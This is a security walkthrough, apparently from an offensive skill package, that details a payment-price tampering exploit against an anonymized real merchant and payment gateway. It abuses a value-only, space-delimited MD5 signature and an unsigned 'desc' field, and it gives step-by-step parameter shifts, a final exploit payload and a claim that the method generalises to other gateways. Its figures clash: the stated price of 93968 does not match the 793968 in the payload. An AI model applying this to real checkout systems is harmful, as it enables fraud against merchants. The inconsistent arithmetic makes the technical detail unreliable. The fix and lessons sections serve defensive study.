# Real Case Walkthrough — Anonymized

End-to-end blackbox PoC against a real Vietnamese e-commerce target. Names anonymized:
- `merchant-X.com` — the merchant being audited
- `gateway-Y.vn` — the third-party payment aggregator (PHP-based, public docs)

This walkthrough demonstrates how the methodology composes into a complete bypass.

## 1. Context

After creating an order on merchant-X.com, the merchant generates a redirect URL to gateway-Y.vn:

```
https://merchant-X.com/payment-connect/payment_method?
  currencyCode=VND
  &merchantServiceId=2182
  &merchantOrderId=016486af-fd90-46a0-80d6-7ad8db034caa
  &amount=618159
  &desc=Thanh+toan+thue+dat_ma+ho+so+000.00.12.H62-201105-0004_ma+so+thue+4000100202
  &transactionId=G22.99.3-241219795252
  &paymentAction=PAY
  &secureCode=64ec91395a771c6ca380864e6216a0aa833f4560d0fce8325164c9846a8bbe39
```

The user is presented with a list of payment methods (multiple banks, e-wallets). On selecting one method (gateway-Y.vn's own wallet), the browser is redirected to:

```
GET https://www.gateway-Y.vn/checkout.php?
  merchant_site_code=63080
  &return_url=https%3A%2F%2Fvpcp.gateway-Y.vn%2Fservice%2Fvpcp%2Freturn
  &receiver=public-office%40gateway-Y.vn
  &transaction_info=Thanh+toan+thue+dat_ma+ho+so+000.00.12.H62-201105-0004_ma+so+thue+4000100202
  &order_code=G22.99.3-241219795252
  &price=618159
  &currency=VND
  &quantity=1
  &tax=0
  &discount=0
  &fee_cal=0
  &fee_shipping=0
  &order_description=
  &buyer_info=NAME+TEST+ATTT
  &affiliate_code=
  &secure_code=a4b2290c78a79057421ad0531fd74f7c
  &lang=vi
  &notify_url=...
  &cancel_url=...
```

Goal: alter `price` so it differs from the merchant's intended amount, while keeping `secure_code` valid.

## 2. Phase 1 — Recon and Public Doc Discovery

gateway-Y.vn publishes integration docs at `gateway-Y.vn/integrate/standard.html`. Within minutes the signing function is found in their sample PHP code:

```php
$arr_param = array(
    'merchant_site_code' => strval($this->merchant_site_code),
    'return_url'         => strval(strtolower($return_url)),
    'receiver'           => strval($receiver),
    'transaction_info'   => strval($transaction_info),
    'order_code'         => strval($order_code),
    'price'              => strval($price),
    'currency'           => strval($currency),
    'quantity'           => strval($quantity),
    'tax'                => strval($tax),
    'discount'           => strval($discount),
    'fee_cal'            => strval($fee_cal),
    'fee_shipping'       => strval($fee_shipping),
    'order_description'  => strval($order_description),
    'buyer_info'         => strval($buyer_info),
    'affiliate_code'     => strval($affiliate_code),
);

$secure_code = '';
$secure_code = implode(' ', $arr_param) . ' ' . $this->secure_pass;
$arr_param['secure_code'] = md5($secure_code);
```

Key observations from the formula:
- Concatenation is **values only** (no param names)
- Delimiter is a single **space** character
- Param order is a **fixed declaration order** (not alphabetical)
- Hash function is `md5(values + secret)`
- The signature covers: `merchant_site_code, return_url, receiver, transaction_info, order_code, price, currency, quantity, tax, discount, fee_cal, fee_shipping, order_description, buyer_info, affiliate_code` and the secret

Notably, the original redirect from merchant-X also carried `desc` — but the gateway code path uses `transaction_info`, not `desc`. The merchant maps `desc` (controlled at order-creation time) into `transaction_info` on the way to the gateway. **`desc` is not in the merchant's signature either** (since it sits in the unsigned merchant URL).

## 3. Phase 2 — Confirming the Algorithm Live

Without spending money, validate the algorithm by sending shifted requests through the cancel flow.

Take an originally valid request and shift one character from `transaction_info` into `order_code`. The MD5-protected secure_code does not change because:
- Both fields are concatenated as values with space delimiter
- Moving a char across the delimiter still produces the same overall string

Original (showing only the relevant fields):
```
&transaction_info=Thanh+toan+thue+dat_ma+ho+so+000.00.12.H62-201105-0004_ma+so+thue+4000100202
&order_code=G22.99.3-241219795252
```

Shifted (one space-delimited token moved):
```
&transaction_info=Thanh+toan+thue+dat_ma+ho+so+000.00.12.H62-201105-0004_ma+so+thue
&order_code=4000100202+G22.99.3-241219795252
```

Submitted with the original `secure_code`. Gateway accepts the request and shows the payment selection page → algorithm is confirmed.

## 4. Phase 3 / 5 — Constructing the Exploit

Goal: change `price` from `618159` to a lower value (the attacker chooses `93968`) while keeping `secure_code` valid.

The original concatenated string (joined with spaces) ends with:
```
... order_code=G22.99.3-241219795252 price=618159 currency=VND quantity=1 tax=0 discount=0 fee_cal=0 fee_shipping=0 order_description= buyer_info=... affiliate_code= SECRET
```

(written with `name=value` form for readability — the actual concat is value-only).

To reduce `price` to `93968`, append the trailing characters `8159` to a different field that:
1. Sits earlier in the value-list (so its content goes first in the concatenation)
2. Is itself accepted by the gateway as opaque text

`transaction_info` fits both criteria. By moving the trailing `8159` from `price`'s value into the tail of `transaction_info`, and inserting `93968` as the new `price`, the concatenated string is unchanged. But on the merchant page, the displayed `price` is `93968`.

Note: the `desc` parameter in the upstream merchant request controls the value that becomes `transaction_info`. Since `desc` is not in any signature, the attacker can inject arbitrary content into it at the merchant step.

Final exploit payload (relevant fields only):
```
&transaction_info=Thanh+toan+thue+dat_ma+ho+so+000.00.12.H62-201105-0004_ma+so+thue+4000100202+G22.99.3-241218772343+93968+VND+1+0+0+0+0
&order_code=G22.99.3-241218772343
&price=793968
...
&order_description=G22.99.3-241218772343+793968+VND+1+0+0+0+0
&secure_code=65fe00fb5f6c684cbc04811f7bc0e264
```

The reconstructed concatenation (joined with spaces) yields the same MD5 as the original signed request, but the gateway's parser sees `price=793968` (or whatever lower value the attacker chooses).

The displayed amount on the gateway selection page reflects the attacker's price; the merchant credits the order based on the gateway's "paid" callback at that lowered price.

## 5. Lessons

1. **Public docs collapsed Phase 2 to minutes.** Without them, the same exercise via shift testing would have taken hours but still been tractable.
2. **The actual root cause is `desc` being unsigned at the merchant.** Even with a perfectly-signed gateway request, the upstream merchant injection let arbitrary content reach the gateway concat string.
3. **The fix on the merchant side is to sign every user-controllable field that flows into the gateway request.** The fix on the gateway side is to use a delimiter that cannot appear in field values, OR to use `name=value` joining with proper escaping.
4. **Other attack surface in the same code**: any field flowing into `transaction_info` (buyer_info, order_description, etc.) is a candidate for the same shift-injection technique.

## 6. Why This Was Easy to Find

- Public docs disclosed the exact signing formula
- The formula used a delimiter (`space`) that appeared frequently in `transaction_info`
- The merchant left `desc` unsigned in its own pre-redirect request
- The cancel flow allowed unlimited free signature verification

Combined: a half-day of focused testing produced the bypass.

## 7. Why The Methodology Generalizes

Other gateways present variations of the same primitives:
- Different delimiter (`|`, `:`, `,`, none) — change one symbol in the shift attack
- Different param order (alphabetical, fixed) — adapt the rebalance position
- Different hash family (HMAC-SHA256, etc.) — coverage gaps still defeat it
- Callback-side bugs (Phase 4) — entirely orthogonal to the forward-request bug

The 5-phase methodology in `SKILL.md` covers all of these.
